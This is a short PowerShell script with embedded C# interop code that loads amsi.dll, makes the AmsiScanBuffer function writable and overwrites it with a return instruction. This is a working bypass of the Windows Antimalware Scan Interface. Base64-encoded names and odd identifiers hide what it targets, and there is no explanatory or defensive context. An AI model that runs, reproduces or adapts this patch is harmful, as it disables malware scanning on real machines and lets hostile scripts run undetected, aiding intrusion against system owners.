$When32 = @"
using System;
using System.Runtime.InteropServices;
public class When32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

$DeeElEl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YW1zaS5kbGw="))
$ASB = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QW1zaVNjYW5CdWZmZXI="))

Add-Type $When32

$LoadLibrary = [When32]::LoadLibrary($DeeElEl)
$Address = [When32]::GetProcAddress($LoadLibrary, $ASB)
$p = 0
[When32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) | Out-Null
$Patch = [Byte[]] (0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)